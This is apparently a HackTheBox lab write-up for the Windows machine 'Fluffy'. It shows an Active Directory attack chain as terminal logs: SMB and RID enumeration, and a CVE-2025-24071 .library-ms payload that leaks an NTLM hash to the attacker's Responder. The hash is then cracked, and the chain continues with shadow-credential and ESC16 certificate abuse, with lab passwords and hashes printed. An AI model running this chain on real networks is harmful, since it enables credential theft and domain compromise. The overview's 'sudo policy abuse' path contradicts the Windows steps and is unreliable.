## Overview

| Field                     | Value |
|---------------------------|-------|
| OS                        | Windows |
| Difficulty                | Not specified |
| Attack Surface            | 53/tcp (domain), 88/tcp (kerberos-sec), 139/tcp (netbios-ssn), 389/tcp (ldap), 445/tcp (microsoft-ds?), 464/tcp (kpasswd5?), 593/tcp (ncacn_http), 636/tcp (ssl/ldap) |
| Primary Entry Vector      | Public exploit path involving CVE-2025-24071 |
| Privilege Escalation Path | Credentialed access -> sudo policy abuse -> elevated shell |

## Reconnaissance

This command is used here to enumerate the exposed services and collect actionable fingerprints before exploitation. The focus is on discovering open ports, service versions, and protocol behavior that can guide the next attack decision. Key flags are kept visible so the same scan can be reproduced during validation or retesting.

```text
j.fleischman / J0elTHEM4n1990!
p.agila / prometheusx-303
```

This command is used here to enumerate the exposed services and collect actionable fingerprints before exploitation. The focus is on discovering open ports, service versions, and protocol behavior that can guide the next attack decision. Key flags are kept visible so the same scan can be reproduced during validation or retesting.

```bash
rustscan -a $ip -r 1-65535 --ulimit 5000
```

```bash
✅[23:43][CPU:38][MEM:47][TUN0:10.10.15.94][/home/n0z0]
🐉 > rustscan -a $ip -r 1-65535 --ulimit 5000
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
RustScan: allowing you to send UDP packets into the void 1200x faster than NMAP

[~] The config file is expected to be at "/home/n0z0/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.129.232.88:53
Open 10.129.232.88:88
Open 10.129.232.88:139
Open 10.129.232.88:389
Open 10.129.232.88:445
Open 10.129.232.88:464
Open 10.129.232.88:593
Open 10.129.232.88:636
Open 10.129.232.88:5985
Open 10.129.232.88:9389
Open 10.129.232.88:49667
Open 10.129.232.88:49689
Open 10.129.232.88:49690
Open 10.129.232.88:49702
Open 10.129.232.88:49697
Open 10.129.232.88:49712
Open 10.129.232.88:49732

```

This command is used here to enumerate the exposed services and collect actionable fingerprints before exploitation. The focus is on discovering open ports, service versions, and protocol behavior that can guide the next attack decision. Key flags are kept visible so the same scan can be reproduced during validation or retesting.

```bash
timestamp=$(date +%Y%m%d-%H%M%S)
```

```bash
✅[0:04][CPU:39][MEM:53][TUN0:10.10.15.94][/home/n0z0]
🐉 > timestamp=$(date +%Y%m%d-%H%M%S)
output_file="$HOME/work/scans/${timestamp}_${ip}.xml"

grc nmap -p- -sCV -sV -T4 -A -Pn "$ip" -oX "$output_file"

echo -e "\e[32mScan result saved to: $output_file\e[0m"
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-13 00:04 JST
Nmap scan report for 10.129.2.153
Host is up (0.27s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-12 22:18:20Z)
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-02-12T22:20:00+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-02-12T22:20:01+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-02-12T22:20:00+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-02-12T22:20:02+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
49702/tcp open  msrpc         Microsoft Windows RPC
49715/tcp open  msrpc         Microsoft Windows RPC
49732/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (96%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (96%), Microsoft Windows 10 1903 - 21H1 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-time:
|   date: 2026-02-12T22:19:22
|_  start_date: N/A

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   274.51 ms 10.10.14.1
2   275.50 ms 10.129.2.153

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 950.53 seconds
Scan result saved to: /home/n0z0/work/scans/20260213-000414_10.129.2.153.xml

```

💡 Why this works  
High-quality reconnaissance turns broad network exposure into a short list of exploitable paths. Service/version context allows precision targeting instead of blind exploitation attempts.

## Initial Foothold

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
netexec smb "$ip" --shares
```

```bash
✅[0:04][CPU:37][MEM:52][TUN0:10.10.15.94][/home/n0z0/Downloads]
🐉 > netexec smb "$ip" --shares

SMB         10.129.2.153    445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.129.2.153    445    DC01             [-] Error enumerating shares: STATUS_USER_SESSION_DELETED

```

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
smbclient -L //$ip -N
smbclient //$ip/IT -m SMB3
smbclient //$ip/NETLOGON -m SMB3
```

```bash
✅[0:07][CPU:14][MEM:50][TUN0:10.10.15.94][/home/n0z0/Downloads]
🐉 > smbclient -L //$ip -N

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	IT              Disk
	NETLOGON        Disk      Logon server share
	SYSVOL          Disk      Logon server share
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.2.153 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

✅[0:08][CPU:12][MEM:49][TUN0:10.10.15.94][/home/n0z0/Downloads]
🐉 > smbclient //$ip/IT -m SMB3
Password for [WORKGROUP\n0z0]:
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*
smb: \> ^C

❌[0:09][CPU:12][MEM:50][TUN0:10.10.15.94][/home/n0z0/Downloads]
🐉 > smbclient //$ip/NETLOGON -m SMB3
Password for [WORKGROUP\n0z0]:
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*
smb: \> ^C

```

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
netexec smb $ip -u 'guest' -p '' --rid-brute
```

```bash
❌[0:20][CPU:10][MEM:64][TUN0:10.10.15.94][/home/n0z0/Downloads]
🐉 > netexec smb $ip -u 'guest' -p '' --rid-brute

SMB         10.129.2.153    445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.129.2.153    445    DC01             [+] fluffy.htb\guest:
SMB         10.129.2.153    445    DC01             498: FLUFFY\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.2.153    445    DC01             500: FLUFFY\Administrator (SidTypeUser)
SMB         10.129.2.153    445    DC01             501: FLUFFY\Guest (SidTypeUser)
SMB         10.129.2.153    445    DC01             502: FLUFFY\krbtgt (SidTypeUser)
SMB         10.129.2.153    445    DC01             512: FLUFFY\Domain Admins (SidTypeGroup)
SMB         10.129.2.153    445    DC01             513: FLUFFY\Domain Users (SidTypeGroup)
SMB         10.129.2.153    445    DC01             514: FLUFFY\Domain Guests (SidTypeGroup)
SMB         10.129.2.153    445    DC01             515: FLUFFY\Domain Computers (SidTypeGroup)
SMB         10.129.2.153    445    DC01             516: FLUFFY\Domain Controllers (SidTypeGroup)
SMB         10.129.2.153    445    DC01             517: FLUFFY\Cert Publishers (SidTypeAlias)
SMB         10.129.2.153    445    DC01             518: FLUFFY\Schema Admins (SidTypeGroup)
SMB         10.129.2.153    445    DC01             519: FLUFFY\Enterprise Admins (SidTypeGroup)
SMB         10.129.2.153    445    DC01             520: FLUFFY\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.2.153    445    DC01             521: FLUFFY\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.2.153    445    DC01             522: FLUFFY\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.2.153    445    DC01             525: FLUFFY\Protected Users (SidTypeGroup)
SMB         10.129.2.153    445    DC01             526: FLUFFY\Key Admins (SidTypeGroup)
SMB         10.129.2.153    445    DC01             527: FLUFFY\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.2.153    445    DC01             553: FLUFFY\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.2.153    445    DC01             571: FLUFFY\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.2.153    445    DC01             572: FLUFFY\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.2.153    445    DC01             1000: FLUFFY\DC01$ (SidTypeUser)
SMB         10.129.2.153    445    DC01             1101: FLUFFY\DnsAdmins (SidTypeAlias)
SMB         10.129.2.153    445    DC01             1102: FLUFFY\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.2.153    445    DC01             1103: FLUFFY\ca_svc (SidTypeUser)
SMB         10.129.2.153    445    DC01             1104: FLUFFY\ldap_svc (SidTypeUser)
SMB         10.129.2.153    445    DC01             1601: FLUFFY\p.agila (SidTypeUser)
SMB         10.129.2.153    445    DC01             1603: FLUFFY\winrm_svc (SidTypeUser)
SMB         10.129.2.153    445    DC01             1604: FLUFFY\Service Account Managers (SidTypeGroup)
SMB         10.129.2.153    445    DC01             1605: FLUFFY\j.coffey (SidTypeUser)
SMB         10.129.2.153    445    DC01             1606: FLUFFY\j.fleischman (SidTypeUser)
SMB         10.129.2.153    445    DC01             1607: FLUFFY\Service Accounts (SidTypeGroup)

```

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
S-1-5-21-497550768-2797716248-2627064577-1103
└─┬─┘ └─────────────┬───────────────────┘ └─┬─┘
  │                 │                        │
Prefix        Domain SID                   RID
```

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
500  = Administrator（必ず存在）
501  = Guest
502  = krbtgt
1000-1999 = ユーザー・マシンアカウント
```

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
netexec smb $ip -u 'guest' -p '' --rid-brute
```

```
S-1-5-21-...-500 → AdministratorS-1-5-21-...-501 → GuestS-1-5-21-...-1103 → ca_svc
```
This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```python
dce.connect()
dce.bind(MSRPC_UUID_LSARPC)  # LSA RPC接続

for rid in range(500, 10000):
    sid = f"{domain_sid}-{rid}"
    try:
        name = LsarLookupSids(sid)  # SIDから名前解決
        print(f"{rid}: {name}")
    except:
        continue  # 存在しないRIDはスキップ
```

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
lookupsid.py fluffy.htb/guest@$ip -no-pass

rpcclient -U 'guest%' $ip
rpcclient $> lsaquery  # Domain SID取得
rpcclient $> lookupsids S-1-5-21-...-1103
```

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
impacket-GetNPUsers fluffy.htb/ -usersfile users.txt -dc-ip $ip -no-pass -format hashcat
```

```bash
✅[0:44][CPU:24][MEM:65][TUN0:10.10.15.94][...ork/02.HTB/Writeup/Fluffy]
🐉 > impacket-GetNPUsers fluffy.htb/ -usersfile users.txt -dc-ip $ip -no-pass -format hashcat

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] User ca_svc doesn't have UF_DONT_REQUIRE_PREAUTH set

```

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
smbmap -H $ip -d fluffy.htb -u j.fleischman -p J0elTHEM4n1990!
```

```bash
❌[1:09][CPU:17][MEM:75][TUN0:10.10.15.94][...ork/02.HTB/Writeup/Fluffy]
🐉 > smbmap -H $ip -d fluffy.htb -u j.fleischman -p J0elTHEM4n1990!

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 1 authenticated session(s)

[+] IP: 10.129.2.153:445	Name: 10.129.2.153        	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	IT                                                	READ, WRITE	
	NETLOGON                                          	READ ONLY	Logon server share
	SYSVOL                                            	READ ONLY	Logon server share
[*] Closed 1 connections

```


*Caption: Screenshot captured during fluffy at stage 1 of the attack chain.*

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
python3 52310.py -i 10.10.15.94 -n document -o ./payloads
```

```bash
🐉 > python3 52310.py -i 10.10.15.94 -n document -o ./payloads
[*] Generating malicious .library-ms file...
[+] Created ZIP: payloads/document.zip
[-] Removed intermediate .library-ms file
[!] Done. Send ZIP to victim and listen for NTLM hash on your SMB server.

```

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
sudo responder -I tun0 -v
```

```bash
❌[2:17][CPU:22][MEM:66][TUN0:10.10.15.94][/tools/windows/bloodhound]
🐉 > sudo responder -I tun0 -v

[SMB] NTLMv2-SSP Client   : 10.129.2.153
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:c74df1b93bbba377:04D33F49557A1B15849CBC4EA271C181:010100000000000000A225F78E9CDC01F94613990B5F5AEF0000000002000800430047004500420001001E00570049004E002D0042004E004200420043004100490044004E004500550004003400570049004E002D0042004E004200420043004100490044004E00450055002E0043004700450042002E004C004F00430041004C000300140043004700450042002E004C004F00430041004C000500140043004700450042002E004C004F00430041004C000700080000A225F78E9CDC0106000400020000000800300030000000000000000100000000200000512EA1D36EACCC9F586B7729CB9D63E5A3B6186B120F8A8147CB2B17046EE8B60A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E00390034000000000000000000

```

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
✅[2:19][CPU:28][MEM:66][TUN0:10.10.15.94][...B/Writeup/Fluffy/payloads]
🐉 > smbclient //$ip/IT -U 'j.fleischman%J0elTHEM4n1990!' -c 'put document1.zip' -m SMB3
putting file document1.zip as \document1.zip (0.3 kB/s) (average 0.3 kB/s)
```

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
❌[2:26][CPU:2][MEM:71][TUN0:10.10.15.94][...ork/02.HTB/Writeup/Fluffy]
🐉 > echo 'p.agila::FLUFFY:c74df1b93bbba377:04D33F49557A1B15849CBC4EA271C181:010100000000000000A225F78E9CDC01F94613990B5F5AEF0000000002000800430047004500420001001E00570049004E002D0042004E004200420043004100490044004E004500550004003400570049004E002D0042004E004200420043004100490044004E00450055002E0043004700450042002E004C004F00430041004C000300140043004700450042002E004C004F00430041004C000500140043004700450042002E004C004F00430041004C000700080000A225F78E9CDC0106000400020000000800300030000000000000000100000000200000512EA1D36EACCC9F586B7729CB9D63E5A3B6186B120F8A8147CB2B17046EE8B60A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E00390034000000000000000000'>hash.txt
```

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
hashcat -m 5600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

```bash
✅[2:27][CPU:6][MEM:71][TUN0:10.10.15.94][...ork/02.HTB/Writeup/Fluffy]
🐉 > hashcat -m 5600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-skylake-avx512-11th Gen Intel(R) Core(TM) i5-1155G7 @ 2.50GHz, 6863/13726 MB (2048 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 514 MB (4061 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344389
* Bytes.....: 139921578
* Keyspace..: 14344389

P.AGILA::FLUFFY:c74df1b93bbba377:04d33f49557a1b15849cbc4ea271c181:010100000000000000a225f78e9cdc01f94613990b5f5aef0000000002000800430047004500420001001e00570049004e002d0042004e004200420043004100490044004e004500550004003400570049004e002d0042004e004200420043004100490044004e00450055002e0043004700450042002e004c004f00430041004c000300140043004700450042002e004c004f00430041004c000500140043004700450042002e004c004f00430041004c000700080000a225f78e9cdc0106000400020000000800300030000000000000000100000000200000512ea1d36eaccc9f586b7729cb9d63e5a3b6186b120f8a8147cb2b17046ee8b60a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310035002e00390034000000000000000000:prometheusx-303

```

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
bloodhound-python -u p.agila -p prometheusx-303 -d fluffy.htb -ns $ip -c all --zip --dns-tcp
```

```bash
✅[2:45][CPU:13][MEM:67][TUN0:10.10.15.94][...ork/02.HTB/Writeup/Fluffy]
🐉 > bloodhound-python -u p.agila -p prometheusx-303 -d fluffy.htb -ns $ip -c all --zip --dns-tcp
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: fluffy.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc01.fluffy.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.fluffy.htb
INFO: Found 10 users
INFO: Found 54 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.fluffy.htb
INFO: Done in 01M 13S
INFO: Compressing output into 20260213024547_bloodhound.zip

```

- `P.AGILA@FLUFFY.HTB` → `MemberOf` → `SERVICE ACCOUNT MANAGERS@FLUFFY.HTB`
- `SERVICE ACCOUNT MANAGERS` → **`GenericAll`** → `SERVICE ACCOUNTS@FLUFFY.HTB`

*Caption: Screenshot captured during fluffy at stage 2 of the attack chain.*


*Caption: Screenshot captured during fluffy at stage 3 of the attack chain.*

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
bloodyAD -d fluffy.htb -u p.agila -p prometheusx-303 --host $ip add groupMember 'SERVICE ACCOUNTS' p.agila
```

```bash
❌[8:15][CPU:6][MEM:71][TUN0:10.10.15.94][...ndows/pywhisker/pywhisker]
🐉 > bloodyAD -d fluffy.htb -u p.agila -p prometheusx-303 --host $ip add groupMember 'SERVICE ACCOUNTS' p.agila
[+] p.agila added to SERVICE ACCOUNTS

```

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
certipy-ad shadow auto -u p.agila@fluffy.htb -p prometheusx-303 -account winrm_svc
```

```bash
✅[8:27][CPU:3][MEM:73][TUN0:10.10.15.94][...ndows/pywhisker/pywhisker]
🐉 > certipy-ad shadow auto -u p.agila@fluffy.htb -p prometheusx-303 -account winrm_svc

Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: FLUFFY.HTB.
[!] Use -debug to print a stacktrace
[*] Targeting user 'winrm_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '0da0d79ecd974240905a9b1ae84020af'
[*] Adding Key Credential with device ID '0da0d79ecd974240905a9b1ae84020af' to the Key Credentials for 'winrm_svc'
[*] Successfully added Key Credential with device ID '0da0d79ecd974240905a9b1ae84020af' to the Key Credentials for 'winrm_svc'
[*] Authenticating as 'winrm_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'winrm_svc@fluffy.htb'
[*] Trying to get TGT...

[*] Got TGT
[*] Saving credential cache to 'winrm_svc.ccache'
[*] Wrote credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Restoring the old Key Credentials for 'winrm_svc'
[*] Successfully restored the old Key Credentials for 'winrm_svc'
[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767

```

### CVE Notes

- **CVE-2025-24071**: A Windows NTLM leak scenario referenced in this path and used to obtain reusable authentication material.
- **CVE-2025-29968**: A known vulnerability referenced in this chain and used as part of exploitation.

💡 Why this works  
Initial access succeeds when a real weakness is chained to controlled execution, credential theft, or authenticated pivoting. Captured outputs and callbacks validate that compromise is reproducible.

## Privilege Escalation

This command is run to enumerate or abuse local trust boundaries and move from user context to elevated privileges. We are specifically validating permission weaknesses, risky binaries, or policy misconfigurations that permit escalation. Flag usage and resulting output are retained to clearly show why the privilege transition succeeds.

```powershell
ÉÍÍÍÍÍÍÍÍÍ͹ Looking AppCmd.exe
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#appcmdexe
    AppCmd.exe was found in C:\Windows\system32\inetsrv\appcmd.exe
      You must be an administrator to run this check

```

This command is run to enumerate or abuse local trust boundaries and move from user context to elevated privileges. We are specifically validating permission weaknesses, risky binaries, or policy misconfigurations that permit escalation. Flag usage and resulting output are retained to clearly show why the privilege transition succeeds.

```bash
certipy-ad find -u ca_svc@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -vulnerable -stdout
```

```bash
❌[4:12][CPU:13][MEM:54][TUN0:10.10.15.94][...ork/02.HTB/Writeup/Fluffy]
🐉 > certipy-ad find -u ca_svc@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -vulnerable -stdout

Certipy v5.0.3 - by Oliver Lyak (ly4k)
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
    Certificate Validity End            : 3024-04-17 16:11:16+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
    Permissions
      Owner                             : FLUFFY.HTB\Administrators
      Access Rights
        ManageCa                        : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC16                             : Security Extension is disabled.
    [*] Remarks
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
Certificate Templates                   : [!] Could not find any certificate templates

```

This command is run to enumerate or abuse local trust boundaries and move from user context to elevated privileges. We are specifically validating permission weaknesses, risky binaries, or policy misconfigurations that permit escalation. Flag usage and resulting output are retained to clearly show why the privilege transition succeeds.

```bash
bloodyAD --host '10.129.5.165' -d 'dc01.fluffy.htb' -u 'p.agila' -p 'prometheusx-303' add groupMember 'SERVICE ACCOUNTS' p.agila

certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip 10.129.5.165 -upn 'administrator' -user 'ca_svc' update

certipy-ad req -u ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.5.165 -target dc01.fluffy.htb -ca fluffy-DC01-CA -template User

